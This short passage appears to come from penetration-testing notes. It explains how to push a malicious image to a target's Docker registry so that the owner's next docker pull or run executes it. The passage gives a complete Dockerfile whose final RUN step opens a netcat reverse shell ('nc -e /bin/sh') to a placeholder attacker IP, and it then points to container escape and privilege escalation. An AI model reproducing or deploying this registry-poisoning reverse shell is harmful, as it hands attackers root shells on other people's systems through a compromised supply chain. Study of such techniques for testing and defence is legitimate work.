With proper authentication, we can upload our owm image to the target's registry.
That way, the next time the owner runs a docker pull or docker run command, their host will download and execute our malicious image as it will be a new version for docker.

Dockerfile that will connect to our machine with netcat

FROM debian:jessie-slim

RUN apt-get update -y
RUN apt-get install netcat -y
RUN nc -e /bin/sh <ATTACKING-MACHINE-IP> 8080

This way we will get access as root to the container. The next step will be to try to escape the container or privesc one way or another.
